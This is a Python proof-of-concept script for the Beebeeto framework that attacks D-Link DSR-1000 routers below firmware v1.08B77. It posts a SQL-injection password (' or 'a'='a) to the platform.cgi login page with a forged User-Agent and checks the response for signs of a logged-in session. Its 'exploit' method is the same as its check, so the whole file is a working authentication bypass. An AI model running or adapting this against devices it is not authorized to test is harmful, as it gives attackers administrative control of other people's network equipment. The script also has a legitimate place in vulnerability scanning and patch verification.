#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2
import requests

from baseframe import BaseFrame
from utils.http import forgeheaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0090',
            'name': 'D-Link DSR-1000 v1.08B77 Authentication Bypass POC',
            'author': 'e3rp4y',
            'create_date': '2014-10-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'D-Link',
            'vul_version': ['< Firmware v1.08B77'],
            'type': 'SQL Injection',
            'tag': ['D-Link漏洞', 'Authentication Bypass', 'SQL Injection'],
            'desc': 'D-Link DSR-1000认证SQL注入漏洞, 可免密码登录路由设备',
            'references': ['http://www.exploit-db.com/papers/30061/',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        ua = forgeheaders.Linux().randomly_get()
        headers = {
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': args['options']['target'],
            'Referer': args['options']['target'] + '/',
            'User-Agent': ua}

        url = args['options']['target'] + 'platform.cgi'
        resp = requests.post(
            url,
            headers=headers,
            data={'thispage': 'index.htm',
                  'Users.UserName': 'admin',
                  'Users.Password': "' or 'a'='a",
                  'button.login.Users.deviceStatus': 'Login',
                  'Login.userAgent': ua})

        if resp.status_code != 200:
            args['success'] = False
            return args

        if 'title="Continue"' not in resp.text and \
           'Logout' not in resp.text:
            args['success'] = False
            return args

        args['success'] = True
        args['poc_ret']['vul_url'] = url
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())